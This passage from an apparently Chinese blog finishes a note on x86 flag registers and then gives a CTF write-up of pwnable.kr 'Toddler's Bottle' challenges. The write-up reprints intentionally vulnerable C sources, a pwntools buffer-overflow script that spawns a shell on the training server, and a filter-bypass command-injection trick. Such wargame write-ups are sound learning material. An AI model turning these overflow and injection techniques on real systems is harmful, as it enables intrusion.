plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br><span class="line">;ax为0，所以ZF为1</span><br><span class="line">mov ax,2</span><br><span class="line">sub ax,1</span><br><span class="line">;ax为1，所以ZF为0</span><br></pre></td></tr></table></figure><p><strong>注意：运算指令是有可能影响标志寄存器的，要注意是否对标志寄存器的某些标志位产生了影响</strong></p></div><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><div class="story post-story"><p>flag的第二位为PF，它记录了相关指令执行后，其结果的所有bit位中1的个数是否为偶数：是偶数则PF为1；反之为0</p></div><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><div class="story post-story"><p>flag的第七位为SF，符号标志位，它记录了相关指令执行后其结果是否为负：是负数则SF为1；反之为0</p><p>注：无符号数的SF位无意义，只有有符号数的SF位才会影响结果</p></div><h2 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h2><div class="story post-story"><p>flag的第0位为SF，进位标志位。一般情况下，在进行<strong>无符号数</strong>的运算时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。</p></div><h2 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h2><div class="story post-story"><p>flag的第11位为OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出：若发生溢出，OF=1；反之OF=0</p><p>注：OF是对<strong>有符号数</strong>运算有意义的标志位；CF是对<strong>无符号数</strong>运算有意义的标志位。</p></div><h2 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h2><div class="story post-story"><p>adc是带进位加法指令，它利用了CF位上记录的进位值。</p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc ax,bx;ax = (ax) + (bx) + CF</span><br></pre></td></tr></table></figure><p>adc指令的意义：执行加法运算中高位-低位分离的大数加法(与add指令一同完成)</p><p>eg:计算1EF0001000H+2010001EF0H，结果放在ax(最高16位)，bx(次高16位)，cx(低16位)中。</p><p>计算分三步：</p><ol><li>先将低16位相加，完成后CF记录本次相加的进位值</li><li>再将次高16位和CF(低16位)相加，完成后CF记录本次相加的进位值</li><li>最后高16位和CF(次高16位)相加，完成后CF记录本次相加的进位值</li></ol></div><h2 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h2><div class="story post-story"><p>sbb是带借位减法指令，它利用了CF位上记录的借位值。</p><p>指令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb ax,bx;(ax) = (ax) - (bx) - CF</span><br></pre></td></tr></table></figure></div><h2 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h2><div class="story post-story"><p>cmp是比较指令，功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。</p><p>指令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,bx;若ax-bx=0,ZF=1,否则ZF=0,其余对标志位影响与减法指令相同</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Toddler &#39;s Bottle Write Up题解</title>
      <link href="/2021/10/09/pwn1/"/>
      <url>/2021/10/09/pwn1/</url>
      
        <content type="html"><![CDATA[<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd.#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给fd文件传入一个参数，该参数减0x1234应该是read的读入文件描述符0，故输入参数应该为0x1234=4660，然后进入read函数，输入LETMEWIN即可。</p><p><img src="C:\Users\Zya1412\Desktop\4.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="4"></p></div><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由源码可知，本题要求我们输入一个长度为20的参数，又因为一个int为4字节，而char为1字节故程序将输入的20个char转化为五个int依次累加得到res，我们的任务就是将得到的res设为0x21DD09EC。最简单的想法是输入16个\x00，再依次按小端法输入\xEC\x09\xDD\x21，但\x09是Tab会将输入阻断，故我们改用16个\x01输入即可：</p><p><img src="C:\Users\Zya1412\Desktop\00.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\00.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="9"></p></div><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// random.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Zya1412\Desktop\1.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="1"></p><p>在gdb中查看汇编代码，由于rand函数在固定种子srand不变的情况下，每次产生的数值是相同的，故我们使得key=0，让key^random的值就是random的值，再查看寄存器eax即可得到random的值。</p><p><img src="C:\Users\Zya1412\Desktop\2.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2"></p><p>我们即可得到random的值为0x6b8b4567，所以我们只需要让eax的值与0x6b8b4567等于0xdeadbeef，所以我们可以得到要输入的值为0xb526fb88=3039230856即可。<img src="C:\Users\Zya1412\Desktop\3.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="3"></p></div><h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题需要进行缓冲区溢出，通过缓冲区溢出将key参数值改为0xcafebabe；开始我认为overflowme和key应该在栈上连续存储，于是输入’A’*32+p32(0xcafebabe)得到了Nah…(，于是我将bof放进ida查看：<img src="C:\Users\Zya1412\Desktop\5.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="5"></p><p>可以看到最后cmp的变量地址与overflowme的距离为var_2C+arg_0为52，故输入缓冲区覆盖key之前的内容需要52个字符。</p><p>写入脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload=remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">payload.send(<span class="built_in">bytes</span>(<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">52</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">payload.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Zya1412\Desktop\6.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="6"></p></div><h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题的逻辑是向cmd1中传入想要执行的指令作为参数然后进行系统调用system执行。但是在filter函数中会检查字符串中是否含有flag sh tmp这种查看flag的关键字，于是我们需要在参数中隐藏或避免出现这些关键字，我们将flag进行分割后再进行拼接避开检查：</p><p><img src="C:\Users\Zya1412\Desktop\9.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="9"></p></div><h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">s[i] ^= XORKEY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// xor your input</span></span><br><span class="line"><span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意到main函数中第一个if的小于号优先级大于等号，而open打开passcode是可以成功的，故open函数返回值不会小于0，所以fd的值为0，而fd又是read函数中的文件描述符，也就是说，read函数向pw_buf是从缓冲区读入的，然后我们再输入一个len为10的字符串pw_buf2，并在xor函数中依次与1做异或得到最终的pw_buf2，我们只需要让pw_buf与做完异或的pw_buf2相同即可，最简单的即：1111111111和0000000000</p><p><img src="C:\Users\Zya1412\Desktop\02.png" class="lazyload" data-srcset="C:\Users\Zya1412\Desktop\02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="02"></p></div><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><div class="story post-story"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 